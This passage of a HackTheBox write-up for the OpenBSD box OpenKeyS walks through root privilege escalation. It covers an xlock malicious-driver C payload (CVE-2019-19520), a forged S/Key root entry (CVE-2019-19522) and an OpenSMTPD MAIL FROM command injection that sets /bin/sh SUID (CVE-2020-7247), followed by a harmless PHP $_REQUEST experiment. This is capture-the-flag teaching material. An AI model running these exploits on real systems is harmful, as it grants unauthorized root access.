+<li>Local privilege escalation via S/Key and YubiKey [CVE-2019-19522]</li>
+<li>Local privilege escalation via su [CVE-2019-19519]</li>
+</ul>
+<p>Reading each of these, the last doesn’t seem useful. The S/Key one jumps out because of the box name, but it only jumps from the <code class="language-plaintext highlighter-rouge">auth</code> group to root, and jennifer is not in auth:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
+</span></code></pre></div></div>
+<p>But, the <code class="language-plaintext highlighter-rouge">xlock</code> vulnerability will allow me to gain the privileges of the <code class="language-plaintext highlighter-rouge">auth</code> group, so I can use these two together to get a shell as root.</p>
+<h3 id="shortcut-script">Shortcut Script</h3>
+<p>To just get root, there’s a beautiful script <a href="https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot">on GitHub</a> that will return a root shell. I’ll open <code class="language-plaintext highlighter-rouge">vi</code> and paste in the code, and then set it executable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span>vi .df 
+<span class="gp">openkeys$</span><span class="w"> </span><span class="nb">chmod</span> +x .df
+</code></pre></div></div>
+<p>Now just run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span>./.df
+<span class="go">./.df[1]: penbsd-authroot: not found
+openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
+[*] checking system ...
+[*] system supports S/Key authentication
+[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
+[*] compiling ...
+[*] running Xvfb ...
+[*] testing for CVE-2019-19520 ...
+[+] success! we have auth group permissions
+
+WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).
+
+[*] trying CVE-2019-19522 (S/Key) ...
+Your password is: EGG LARD GROW HOG DRAG LAIN
+otp-md5 99 obsd91335
+S/Key Password:
+</span><span class="gp">openkeys#</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">f3a553b1************************
+</span></code></pre></div></div>
+<h3 id="manual-cve-2019-19520">Manual CVE-2019-19520</h3>
+<h4 id="overview">Overview</h4>
+<p><code class="language-plaintext highlighter-rouge">xlock</code> is program that locks the screen and waits for the user to re-enter their password. There is a check (in <code class="language-plaintext highlighter-rouge">xenocara/lib/mesa/src/loader/loader.c</code>) to make sure that SUID binaries can’t use the <code class="language-plaintext highlighter-rouge">LIBGL_DRIVERS_PATH</code> environment variable.  This makes sense, because otherwise anyone could set the path to a directory they control, create a malicious library/driver that is loaded by a SUID binary, and then they get a shell as the owner of that binary.</p>
+<p>The vulnerability is that the check in OpenBSD checks for SUID, but forgets about SetGUID binaries:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">113</span>    <span class="nf">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="n">getuid</span><span class="p">())</span> <span class="p">{</span>
+<span class="mi">114</span>       <span class="cm">/* don't allow setuid apps to use LIBGL_DRIVERS_PATH */</span>
+<span class="mi">115</span>       <span class="n">libPaths</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"LIBGL_DRIVERS_PATH"</span><span class="p">);</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">xlock</code> runs as the <code class="language-plaintext highlighter-rouge">auth</code> group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/X11R6/bin/xlock
+<span class="go">-rwxr-sr-x  1 root  auth  3138520 Oct 12  2019 /usr/X11R6/bin/xlock
+</span></code></pre></div></div>
+<p>It also tries to load a driver named <code class="language-plaintext highlighter-rouge">swrast_dri.so</code>. So the attack is basically to drop a malicious library file with a <code class="language-plaintext highlighter-rouge">static void __attribute__ ((constructor)) _init (void)</code> function that will just exec a shell.</p>
+<h4 id="shell">Shell</h4>
+<p>The proof of concept in the Qualys paper uses the following:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;paths.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">_init</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">gid_t</span> <span class="n">rgid</span><span class="p">,</span> <span class="n">egid</span><span class="p">,</span> <span class="n">sgid</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">getresgid</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rgid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">egid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sgid</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="n">__LINE__</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">setresgid</span><span class="p">(</span><span class="n">sgid</span><span class="p">,</span> <span class="n">sgid</span><span class="p">,</span> <span class="n">sgid</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="n">__LINE__</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">_PATH_KSHELL</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">_exit</span><span class="p">(</span><span class="n">__LINE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This looks confusing at first, but really, it checks that can read the set-group-id of the current process, then sets the real, effective, and set-group-id groups to that group (in this case <code class="language-plaintext highlighter-rouge">auth</code>). Then it sets <code class="language-plaintext highlighter-rouge">argv</code> to <code class="language-plaintext highlighter-rouge">[/bin/ksh, 0]</code>, as <code class="language-plaintext highlighter-rouge">_PATH_KSHELL</code> is defined in <code class="language-plaintext highlighter-rouge">paths.h</code>, which I can find that on OpenKeyS:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span>find /usr/ <span class="nt">-name</span> paths.h 2&gt;/dev/null
+<span class="go">/usr/src/include/paths.h
+/usr/include/paths.h
+</span><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">grep </span>KSHELL /usr/include/paths.h     
+<span class="c">#define _PATH_KSHELL    "/bin/ksh"
+</span></code></pre></div></div>
+<p>Then it calls <code class="language-plaintext highlighter-rouge">execve</code> with that set of args, which replaces the current process with the new shell.</p>
+<h4 id="execute">Execute</h4>
+<p>I’ll run with the POC from Qualys, working out of any directory (Qualys shows <code class="language-plaintext highlighter-rouge">/tmp</code>, but I’ll use <code class="language-plaintext highlighter-rouge">/var/tmp</code> for variety). First I’ll drop the code for the shell and compile it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&gt;</span> swrast_dri.c <span class="o">&lt;&lt;</span> <span class="sh">"</span><span class="no">EOF</span><span class="sh">"
+</span><span class="go">&gt; #include &lt;paths.h&gt;   
+&gt; #include &lt;sys/types.h&gt;       
+&gt; #include &lt;unistd.h&gt;                                                                                                                                                                                            
+&gt;          
+&gt; static void __attribute__ ((constructor)) _init (void) {
+&gt;     gid_t rgid, egid, sgid;                   
+&gt;     if (getresgid(&amp;rgid, &amp;egid, &amp;sgid) != 0) _exit(__LINE__);
+&gt;     if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
+&gt;                                
+&gt;     char * const argv[] = { _PATH_KSHELL, NULL };
+&gt;     execve(argv[0], argv, NULL);
+&gt;     _exit(__LINE__);                    
+&gt; }                                              
+&gt; EOF                             
+</span><span class="gp">openkeys$</span><span class="w"> </span>gcc <span class="nt">-fpic</span> <span class="nt">-shared</span> <span class="nt">-s</span> <span class="nt">-o</span> swrast_dri.so swrast_dri.c
+</code></pre></div></div>
+<p>Next I run <code class="language-plaintext highlighter-rouge">Xvfb</code>, which is the virtual framebuffer. It’s not totally clear to my why I do this, but I’m setting up the server to listen for connections on a server (poc uses <code class="language-plaintext highlighter-rouge">:66</code>, but it’s arbitrary, I’ll use <code class="language-plaintext highlighter-rouge">:45</code>). I think this is to allow me to get a response from <code class="language-plaintext highlighter-rouge">xlock</code> even though it’s not a program that displays anything. When I run it, sometimes it throws an error (on a clean reset it does not), but it’s still running in the background (because of the <code class="language-plaintext highlighter-rouge">&amp;</code> at the end of the line):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">env</span> <span class="nt">-i</span> /usr/X11R6/bin/Xvfb :45 <span class="nt">-cc</span> 0 &amp;
+<span class="go">[1] 44906
+</span><span class="gp">openkeys$</span><span class="w"> </span>_XSERVTransmkdir: ERROR: euid <span class="o">!=</span> 0,directory /tmp/.X11-unix will not be created.
+</code></pre></div></div>
+<p>Now I’ll run <code class="language-plaintext highlighter-rouge">xlock</code>, with the <code class="language-plaintext highlighter-rouge">LIBGL_DRIVERS_PATH</code> set to the current directory, and tell it to display on <code class="language-plaintext highlighter-rouge">:45</code>. The resulting shell has the <code class="language-plaintext highlighter-rouge">auth</code> group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">env</span> <span class="nt">-i</span> <span class="nv">LIBGL_DRIVERS_PATH</span><span class="o">=</span><span class="nb">.</span> /usr/X11R6/bin/xlock <span class="nt">-display</span> :45
+<span class="gp">openkeys$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)
+</span></code></pre></div></div>
+<h3 id="manual-cve-2019-19522">Manual CVE-2019-19522</h3>
+<h4 id="skey-background">S/Key Background</h4>
+<p><a href="https://en.wikipedia.org/wiki/S/KEY">S/Key</a> is a one-time password (OTP) system. It works by starting with some seed, hashing it, and saving that as the last item in a list. It then hashes that result again, and saves it as the second to last item. It continues n times, generating a list of n hashes. The server keeps only the first hash on the list, and give the rest (2 to n) to the user. When the user logs in, they provide the top hash on the list, which the server hashes. If it matches what was in the config, it grants access and updates the config with the provided hash. The user can cross the top hash off their list, next time providing the next hash.</p>
+<p>The config file for each use lives in <code class="language-plaintext highlighter-rouge">/etc/skey</code>. The <a href="https://man.openbsd.org/skey.5">man page</a> for S/Key shows an example file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+md5
+99
+obsd36521
+1f4359a3764b675d
+</code></pre></div></div>
+<p>This file shows the user, the hash algorithm, the sequence number, the seed to be used with the hash, and the next result.</p>
+<p>The other thing to know about S/Key - so the user doesn’t have to type in a long, hex string, the hash is broken up into six short words, one to four characters each. For example <code class="language-plaintext highlighter-rouge">3F3B F4B4 145F D74B</code> is represented as <code class="language-plaintext highlighter-rouge">TAG SLOW NOV MIN WOOL KENO</code>.</p>
+<h4 id="exploit-background">Exploit Background</h4>
+<p>The issue here is that the <code class="language-plaintext highlighter-rouge">/etc/skey</code> directory is writable by the <code class="language-plaintext highlighter-rouge">auth</code> group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> /etc/skey
+<span class="go">drwx-wx--T  2 root  auth  512 Jun 24 09:25 /etc/skey
+</span></code></pre></div></div>
+<p>This means that as <code class="language-plaintext highlighter-rouge">auth</code>, I can write a config file into the directory for any user, including root, and then authenticate against S/Key to get a shell.</p>
+<h4 id="execute-1">Execute</h4>
+<p>With a shell in the <code class="language-plaintext highlighter-rouge">auth</code> group, I’ll write the file and change the permissions to 600:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'root md5 0100 obsd91335 8b6d96e0ef1b1c21'</span> <span class="o">&gt;</span> /etc/skey/root
+<span class="gp">openkeys$</span><span class="w"> </span><span class="nb">chmod </span>0600 /etc/skey/root
+</code></pre></div></div>
+<p>I actually can’t look at the result, but it is in there. Now I can run <code class="language-plaintext highlighter-rouge">su</code> to get a shell as root. I’ll use <code class="language-plaintext highlighter-rouge">-l</code> to actually login, <code class="language-plaintext highlighter-rouge">-a skey</code> to specify S/Key auth. The POC also uses <code class="language-plaintext highlighter-rouge">env -i TERM=vt220</code> to clear the environment and then set the terminal on running. I can run without that, but then I’m prompted for the terminal type. When prompted for the password, I’ll enter “EGG LARD GROW HOG DRAG LAIN”, because I know from the script that is what is expected for the seed 8b6d96e0ef1b1c21. Then it returns a root shell.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">env</span> <span class="nt">-i</span> <span class="nv">TERM</span><span class="o">=</span>vt220 su <span class="nt">-l</span> <span class="nt">-a</span> skey
+<span class="go">otp-md5 99 obsd91335
+</span><span class="gp">S/Key Password:</span><span class="w">                                                                                         
+</span><span class="gp">openkeys#</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="unintended-root---cve-2020-7247">Unintended Root - CVE-2020-7247</h3>
+<p>A few days after this box was submitted, a new CVE for OpenBSD was released, <a href="https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt">CVE-2020-7247</a>, allowing for command injection into the SMTP daemon. OpenKeyS is vulnerable to it. I’ll connect to port 25 on localhost. The connection will hang for several minutes while it tries to resolve a DNS query to 8.8.8.8. Eventually, it will return with it’s 220 statement. I’ll identify as jennifer, and then send a malicious <code class="language-plaintext highlighter-rouge">MAIL FROM:</code> with a command injection. I’ll find a valid recipient (jennifer again), and then send an empty email:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span>nc 127.0.0.1 25 
+<span class="go">220 openkeys.htb ESMTP OpenSMTPD
+HELO jennifer
+250 openkeys.htb Hello jennifer [127.0.0.1], pleased to meet you
+MAIL FROM:&lt;;chmod u+s /bin/sh;&gt;
+250 2.0.0 Ok
+RCPT TO:&lt;jennifer&gt;
+250 2.1.5 Destination address valid: Recipient ok
+DATA
+354 Enter mail, end with "." on a line by itself
+</span><span class="c">.
+</span><span class="go">250 2.0.0 fffb5159 Message accepted for delivery
+</span></code></pre></div></div>
+<p>I’m very limited in what kind of command injections I can do, the maximum length for the address is 64 characters, and any characters in <code class="language-plaintext highlighter-rouge">!#$%&amp;'*?</code><code class="language-plaintext highlighter-rouge">{|}~</code>are escaped to a<code class="language-plaintext highlighter-rouge">:</code>. The simple payload above works nicely. After running it, I’ll Ctrl-c to kill the connection to SMTP, and now <code class="language-plaintext highlighter-rouge">/bin/sh</code> is SUID:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/sh
+<span class="go">-r-sr-xr-x  3 root  bin  625032 Oct 12  2019 /bin/sh
+</span></code></pre></div></div>
+<p>Running it returns a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span>/bin/sh
+<span class="gp">openkeys#</span><span class="w"> 
+</span></code></pre></div></div>
+<h3 id="php-_request">PHP $_REQUEST</h3>
+<h4 id="local-script">Local Script</h4>
+<p>Having spent my entire hacking life thinking that <code class="language-plaintext highlighter-rouge">$_REQUEST</code> checked only GET and POST parameters, I wanted to play more with this. I wrote a dumb little PHP program that will inspect and print <code class="language-plaintext highlighter-rouge">$_GET</code>, <code class="language-plaintext highlighter-rouge">$_POST</code>, <code class="language-plaintext highlighter-rouge">$_COOKIE</code>, and <code class="language-plaintext highlighter-rouge">$_REQUEST</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s2">"GET[test]: "</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"POST[test]: "</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"COOKIE[test]: "</span> <span class="mf">.</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"REQUEST[test]: "</span> <span class="mf">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>I then served it locally using the PHP built-in server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>php <span class="nt">-S</span> 127.0.0.1:8888
+<span class="go">PHP 7.3.15-3 Development Server started at Mon Jul 27 21:14:38 2020
+Listening on http://127.0.0.1:8888
+Document root is /media/sf_CTFs/hackthebox/openkeys-10.10.10.199
+Press Ctrl-C to quit.
+</span></code></pre></div></div>
+<p>To make sure everything worked, from another terminal I tried sending just a GET parameter and just a POST parameter:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl 127.0.0.1:8888/test.php?test<span class="o">=</span>get
+<span class="go">GET[test]: get
+POST[test]: 
+COOKIE[test]: 
+REQUEST[test]: get
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl 127.0.0.1:8888/test.php <span class="nt">-d</span> <span class="s1">'test=post'</span>
+<span class="go">GET[test]: 
+POST[test]: post
+COOKIE[test]: 
+REQUEST[test]: post
+</span></code></pre></div></div>
+<p>When the same parameter exists in both GET and POST, <code class="language-plaintext highlighter-rouge">$_REQUEST</code> favors POST:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl 127.0.0.1:8888/test.php?test<span class="o">=</span>get <span class="nt">-d</span> <span class="s1">'test=post'</span>
+<span class="go">GET[test]: get
+POST[test]: post
+COOKIE[test]: 
+REQUEST[test]: post
+</span></code></pre></div></div>
+<p>What about the case I had on OpenKeyS where I sent both a POST and a cookie? It didn’t seem to go to <code class="language-plaintext highlighter-rouge">$_REQUEST</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl 127.0.0.1:8888/test.php <span class="nt">-H</span> <span class="s1">'Cookie: test=cookie'</span> <span class="nt">-d</span> <span class="s2">"test=post"</span>
+<span class="go">GET[test]: 
+POST[test]: post
+COOKIE[test]: cookie
+REQUEST[test]: post
+</span></code></pre></div></div>
+<p>I took the POST data out, and it still didn’t work like it did on OpenKeyS:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl 127.0.0.1:8888/test.php <span class="nt">-H</span> <span class="s1">'Cookie: test=cookie'</span>
+<span class="go">GET[test]: 
+POST[test]: 
+COOKIE[test]: cookie
+REQUEST[test]: 
+</span></code></pre></div></div>
+<h4 id="back-to-the-docs">Back to the Docs</h4>
+<p>Back in the <a href="https://www.php.net/manual/en/reserved.variables.request.php">PHP docs</a> for <code class="language-plaintext highlighter-rouge">$_REQUEST</code>, there’s this:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200727211834441.webp" type="image/webp"/>
+<img alt="image-20200727211834441" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200727211834441.png"/>
+</picture>
+<p>That link leads to the <a href="https://www.php.net/manual/en/ini.core.php#ini.request-order">docs</a> for <code class="language-plaintext highlighter-rouge">php.ini</code>, to the section on <code class="language-plaintext highlighter-rouge">request_order</code>:</p>
+<blockquote>
+<p>This directive describes the order in which PHP registers GET, POST and Cookie variables into the _REQUEST array. Registration is done from left to right, newer values override older values.</p>
+<p>If this directive is not set, <a href="https://www.php.net/manual/en/ini.core.php#ini.variables-order">variables_order</a> is used for <a href="https://www.php.net/manual/en/reserved.variables.request.php">$_REQUEST</a> contents.</p>
+<p>Note that the default distribution php.ini files does not contain the <em>‘C’</em> for cookies, due to security concerns.</p>
+</blockquote>
+<p>That description has two important points: if it’s not set, the default is to follow <code class="language-plaintext highlighter-rouge">variables_order</code>, and that by default, cookies are not included (which explains why it’s not doing anything in the test above).</p>
+<h4 id="phpini">php.ini</h4>
+<p>I grabbed the <code class="language-plaintext highlighter-rouge">php.ini</code> file from OpenKeyS. The section on <code class="language-plaintext highlighter-rouge">request_order</code> is commented out (and the spacing is slightly off, suggesting it might have been an edit by the box author):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="nc">This</span> <span class="n">directive</span> <span class="n">determines</span> <span class="n">which</span> <span class="n">super</span> <span class="k">global</span> <span class="nf">data</span> <span class="p">(</span><span class="nc">G</span><span class="p">,</span><span class="nc">P</span> <span class="o">&amp;</span> <span class="nc">C</span><span class="p">)</span> <span class="n">should</span> <span class="n">be</span>
+<span class="p">;</span> <span class="n">registered</span> <span class="n">into</span> <span class="n">the</span> <span class="n">super</span> <span class="k">global</span> <span class="k">array</span> <span class="no">REQUEST</span><span class="mf">.</span> <span class="k">If</span> <span class="n">so</span><span class="p">,</span> <span class="n">it</span> <span class="n">also</span> <span class="n">determines</span>
+<span class="p">;</span> <span class="n">the</span> <span class="n">order</span> <span class="n">in</span> <span class="n">which</span> <span class="n">that</span> <span class="n">data</span> <span class="n">is</span> <span class="n">registered</span><span class="mf">.</span> <span class="nc">The</span> <span class="n">values</span> <span class="k">for</span> <span class="n">this</span> <span class="n">directive</span>
+<span class="p">;</span> <span class="n">are</span> <span class="n">specified</span> <span class="n">in</span> <span class="n">the</span> <span class="n">same</span> <span class="n">manner</span> <span class="k">as</span> <span class="n">the</span> <span class="n">variables_order</span> <span class="n">directive</span><span class="p">,</span>
+<span class="p">;</span> <span class="no">EXCEPT</span> <span class="n">one</span><span class="mf">.</span> <span class="nc">Leaving</span> <span class="n">this</span> <span class="n">value</span> <span class="k">empty</span> <span class="n">will</span> <span class="n">cause</span> <span class="no">PHP</span> <span class="n">to</span> <span class="kn">use</span> <span class="n">the</span> <span class="n">value</span> <span class="n">set</span>
+<span class="p">;</span> <span class="n">in</span> <span class="n">the</span> <span class="n">variables_order</span> <span class="n">directive</span><span class="mf">.</span> <span class="nc">It</span> <span class="n">does</span> <span class="n">not</span> <span class="n">mean</span> <span class="n">it</span> <span class="n">will</span> <span class="n">leave</span> <span class="n">the</span> <span class="n">super</span>
+<span class="p">;</span> <span class="n">globals</span> <span class="k">array</span> <span class="no">REQUEST</span> <span class="k">empty</span><span class="mf">.</span>
+<span class="p">;</span> <span class="k">Default</span> <span class="nc">Value</span><span class="o">:</span> <span class="nc">None</span>
+<span class="p">;</span> <span class="nc">Development</span> <span class="nc">Value</span><span class="o">:</span> <span class="s2">"GP"</span>
+<span class="p">;</span> <span class="nc">Production</span> <span class="nc">Value</span><span class="o">:</span> <span class="s2">"GP"</span>
+<span class="p">;</span> <span class="n">http</span><span class="o">://</span><span class="n">php</span><span class="mf">.</span><span class="n">net</span><span class="o">/</span><span class="n">request</span><span class="o">-</span><span class="n">order</span>
+<span class="p">;</span><span class="n">request_order</span> <span class="o">=</span> <span class="s2">"GP"</span>
+</code></pre></div></div>
+<p>Based on the docs above, I checked the <code class="language-plaintext highlighter-rouge">variables_order</code> (just above <code class="language-plaintext highlighter-rouge">request_order</code> in the <code class="language-plaintext highlighter-rouge">.ini</code> file):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="nc">This</span> <span class="n">directive</span> <span class="n">determines</span> <span class="n">which</span> <span class="n">super</span> <span class="k">global</span> <span class="n">arrays</span> <span class="n">are</span> <span class="n">registered</span> <span class="n">when</span> <span class="no">PHP</span>
+<span class="p">;</span> <span class="n">starts</span> <span class="n">up</span><span class="mf">.</span> <span class="nc">G</span><span class="p">,</span><span class="nc">P</span><span class="p">,</span><span class="nc">C</span><span class="p">,</span><span class="nc">E</span> <span class="o">&amp;</span> <span class="nc">S</span> <span class="n">are</span> <span class="n">abbreviations</span> <span class="k">for</span> <span class="n">the</span> <span class="n">following</span> <span class="n">respective</span> <span class="n">super</span>
+<span class="p">;</span> <span class="n">globals</span><span class="o">:</span> <span class="no">GET</span><span class="p">,</span> <span class="no">POST</span><span class="p">,</span> <span class="no">COOKIE</span><span class="p">,</span> <span class="no">ENV</span> <span class="k">and</span> <span class="no">SERVER</span><span class="mf">.</span> <span class="nc">There</span> <span class="n">is</span> <span class="n">a</span> <span class="n">performance</span> <span class="n">penalty</span>
+<span class="p">;</span> <span class="n">paid</span> <span class="k">for</span> <span class="n">the</span> <span class="n">registration</span> <span class="n">of</span> <span class="n">these</span> <span class="n">arrays</span> <span class="k">and</span> <span class="n">because</span> <span class="no">ENV</span> <span class="n">is</span> <span class="n">not</span> <span class="k">as</span> <span class="n">commonly</span>
+<span class="p">;</span> <span class="n">used</span> <span class="k">as</span> <span class="n">the</span> <span class="n">others</span><span class="p">,</span> <span class="no">ENV</span> <span class="n">is</span> <span class="n">not</span> <span class="n">recommended</span> <span class="n">on</span> <span class="n">productions</span> <span class="n">servers</span><span class="mf">.</span> <span class="nc">You</span>
+<span class="p">;</span> <span class="n">can</span> <span class="n">still</span> <span class="n">get</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">environment</span> <span class="n">variables</span> <span class="n">through</span> <span class="nb">getenv</span><span class="p">()</span> <span class="n">should</span> <span class="n">you</span>
+<span class="p">;</span> <span class="n">need</span> <span class="n">to</span><span class="mf">.</span>
+<span class="p">;</span> <span class="k">Default</span> <span class="nc">Value</span><span class="o">:</span> <span class="s2">"EGPCS"</span>
+<span class="p">;</span> <span class="nc">Development</span> <span class="nc">Value</span><span class="o">:</span> <span class="s2">"GPCS"</span>
+<span class="p">;</span> <span class="nc">Production</span> <span class="nc">Value</span><span class="o">:</span> <span class="s2">"GPCS"</span><span class="p">;</span>
+<span class="p">;</span> <span class="n">http</span><span class="o">://</span><span class="n">php</span><span class="mf">.</span><span class="n">net</span><span class="o">/</span><span class="n">variables</span><span class="o">-</span><span class="n">order</span>
+<span class="n">variables_order</span> <span class="o">=</span> <span class="s2">"GPCS"</span>
+</code></pre></div></div>
+<p>This is set to run GET, POST, cookies, and then server. For <code class="language-plaintext highlighter-rouge">request_order</code>, server isn’t an option, so it will run <code class="language-plaintext highlighter-rouge">GPC</code>.</p>
+<h4 id="local-script-again">Local Script Again</h4>
+<p>I started the PHP server again, this time with the <code class="language-plaintext highlighter-rouge">.ini</code> file by running <code class="language-plaintext highlighter-rouge">php -S 127.0.0.1:8888 -c php-7.3.ini</code>. It threw some warnings about missing modules that weren’t installed on my host, but it did start.</p>
+<p>Now things behave like I experienced on the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl 127.0.0.1:8888/test.php <span class="nt">-H</span> <span class="s1">'Cookie: test=cookie'</span> <span class="nt">-d</span> <span class="s2">"test=post"</span>
+<span class="go">GET[test]: 
+POST[test]: post
+COOKIE[test]: cookie
+REQUEST[test]: cookie
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/12/12/htb-openkeys.html"></a>
+</article>
